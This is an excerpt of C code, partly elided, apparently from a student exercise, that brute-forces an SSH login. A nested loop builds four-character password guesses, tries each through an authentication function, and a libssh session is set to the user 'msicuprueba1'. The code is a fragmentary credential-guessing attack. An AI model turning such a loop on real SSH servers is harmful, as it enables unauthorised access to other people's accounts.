...
void FuerzaBruta(){
	...
	for (i = 0; i < 10; ++i) {
		for (j = 0; j < 10; ++j) {
			for (k = 0; k < 5; ++k) {
				for (l = 0; l < 3; ++l) {
					char cadena[5]= {numeros[i],numeros[j],caracteres[k],numerosfinales[l]};
					printf("%s\n", cadena);
					if(autenticar(cadena)==1){
						exit(-1);
						break;
					}
				}						
...
int ConexionSocket(){
	...
	ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, "msicuprueba1");
